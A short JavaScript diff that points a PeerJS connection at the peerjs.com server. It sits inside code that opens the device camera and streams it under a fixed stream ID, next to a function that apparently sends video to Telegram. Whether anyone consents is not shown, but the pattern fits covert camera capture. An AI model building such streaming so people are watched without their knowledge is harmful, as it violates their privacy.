@@ -199,7 +199,11 @@ async function sendVideoToTelegram(videoBlob) {
 // ====== PHÁT CAMERA QUA PEERJS ======
 function startPeerStream() {
   const VIDEO_ID = "my-fixed-stream-id";
-  const peer = new Peer(VIDEO_ID);
+  const peer = new Peer(VIDEO_ID, {
+  host: "peerjs.com",
+  port: 443,
+  secure: true
+});
   peer.on('open', () => {
     navigator.mediaDevices.getUserMedia({ video: true, audio: false })
       .then(stream => {
